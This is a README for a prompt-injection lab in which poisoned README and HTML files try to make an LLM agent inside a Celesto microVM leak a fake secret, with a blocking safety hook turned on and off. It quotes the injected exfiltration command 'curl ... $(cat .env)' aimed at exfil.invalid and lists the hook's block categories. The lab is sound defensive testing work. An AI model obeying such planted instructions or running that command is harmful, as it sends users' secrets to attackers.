# Prompt-Injection Exfiltration Lab on Celesto

An LLM agent reads untrusted files inside a Celesto microVM that also holds a fake secret. A host-side safety hook
decides what the guest may run. I measure how often a poisoned README / web page makes the agent try to leak the secret,
with the defense on and off.

## Problem statement
**Who:** developers and students who let LLM agents read untrusted READMEs and web pages on a machine that also holds
secrets (API keys, `.env` files). **What the agent does on its computer:** reads a poisoned `README.md` and `page.html`,
writes notes, then merges them into `summary.md` (a 10-step job). **Proof it worked:** `summary.md` exists, no canary
appears in any output, and `logs/commands.jsonl` shows every command with its allow/block decision.
Why Celesto and not `subprocess.run()`: the poisoned page tells the agent to run `curl ... $(cat .env)`. On the host
that is an incident; in a disposable microVM it is a log line, and the guest (with its disk state) survives a mid-task crash.

## Architecture
```mermaid
flowchart LR
  Operator --> API[Run Ledger API :8080]
  API --> PG[(Postgres ledger)]
  Runner[runner: agent loop on host] -->|prompts| LLM[OpenAI-compatible LLM]
  Runner -->|every command| Hook{{Safety hook}}
  Hook -->|allow| SBX[Celesto microVM]
  Hook -->|block| LOG
  Hook --> LOG[logs/commands.jsonl]
  Runner -->|create/run/stop/start/delete| SBX
  SBX -. exfil attempt to exfil.invalid .-> NET((Internet))
  Runner -->|run rows| API
  Runner --> REP[reports/*.json]
```
Two trust zones: the control plane (compose: `api` + `ledger`) and the execution zone (Celesto computers). The runner never
executes agent commands on the host; it only talks to the `celesto` CLI.

## How I used Celesto
- **Safety hooks (`runner/hooks.py`)**: code that runs before the guest sees a command; logs allow/block, blocks egress,
  secret reads, destructive commands and base64/hex/reversed canary leaks. A prompt cannot do this.
- **Persistence (`runner/pipeline.py`)**: on a step-7 failure the same computer is stopped and started, prior outputs are
  verified on disk, and only step 7 is retried.
- The real backend uses the Celesto 0.0.14 Python SDK. Celesto does not accept a
  caller-supplied computer name: the runner maps each local `sbx-...` name to
  the returned cloud computer ID and uses that ID for run, stop, start, get,
  and delete. The SDK's `run` operation is exposed as `Computers.exec`.
- Not used (and why): snapshots are local-runtime only and I run on Windows, so I use Cloud. Network policy: not used
  because I have not verified it on Cloud; the hook is my egress control. (Edit if that changes.)

## Eval report
20+ fresh sandboxes, one per run, deleted afterwards: `python -m runner eval --runs 20`.
Numbers are in `reports/reliability.json` and `reports/postmortem.md` (success rate, p50/p90, boot-to-ready, cost estimate).
TODO: paste the final numbers and your failure analysis here.

## Containment test
`python -m runner containment --n 3` runs (1) a deterministic replay of four malicious commands with the hook off and on,
(2) LLM-driven runs with poisoned inputs with the hook off and on (attack success rate), and (3) host checks: a sentinel
file hash and a host-only canary env var that must never appear in the log. Evidence: `reports/evidence/containment.log`,
`reports/evidence/asr.json`. The exfil sink is `exfil.invalid`, a reserved TLD that cannot resolve.
Limits, stated honestly: the hook is a pattern blocklist and can be bypassed by creative commands; the real boundary is the microVM itself. The hook raises the cost of an attack and gives an audit trail.
TODO: paste the result and a screenshot.

## State and failure design
Step 7 of 10 fails (injected, `python -m runner failure`). Policy: **resume** (stop/start the same computer, verify the
files from steps 5-6, retry step 7). Fresh start repays boot and two LLM phases; rollback needs snapshots (local runtime
only). If the state check fails after restart the runner escalates to **fresh** on a new uniquely named guest. All paths
end in delete: `managed_sandbox` (`runner/lifecycle.py`) deletes in `finally`, covering success, failure and Ctrl-C.

## Setup
```powershell
Copy-Item .env.example .env     # fill in CELESTO_API_KEY and the LLM_* values; never commit .env
docker compose up --build       # control plane; GET http://localhost:8080/health
python -m pip install -r requirements.txt
& "$env:APPDATA\Python\Python310\Scripts\celesto.exe" auth status
python -m runner smoke          # creates, runs, and deletes one cloud sandbox
python -m pytest tests/test_runner.py -q   # offline tests (mock backend)
```
Dry run without Celesto: add `--backend mock` (writes to `reports_dryrun/`, never the graded files).

The focused backend tests use a mocked SDK client and do not create cloud
resources:

```powershell
python -m pytest tests/test_celesto_backend.py tests/test_runner.py -q
```

Cloud commands such as `python -m runner smoke`, `eval`, `containment`,
`failure`, `concurrency`, and `lifecycle` are intentionally not run by the
offline test suite. They create or use billable resources and should only be
run after authentication, budget, and cleanup have been reviewed.

AI assistants used: Claude (scaffolding, runner). Credit: Celesto docs and examples.
